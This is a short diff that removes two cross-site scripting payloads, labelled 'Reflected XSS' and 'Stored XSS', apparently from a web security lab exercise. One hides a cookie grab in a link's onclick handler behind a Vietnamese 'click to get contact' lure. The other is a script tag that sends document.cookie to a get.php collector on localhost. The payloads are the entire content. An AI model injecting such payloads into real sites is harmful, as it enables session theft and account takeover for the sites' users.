@@ -1,8 +1,0 @@
-Reflected XSS
-<a href="" onclick=\"document.location=\'../getCookie/get.php?cookie=\'+escape\(document.cookie\)\;\">
-    <img src="../../images/gai.jpg" witdh="150px" height="150px"> <br>Click để lấy contact
-</a>
-
-
-Stored XSS
-<script> alert("Hacked");var img = new Image(); img.src = "http://localhost/Webs/getCookie/get.php?cookie=" + document.cookie; </script>
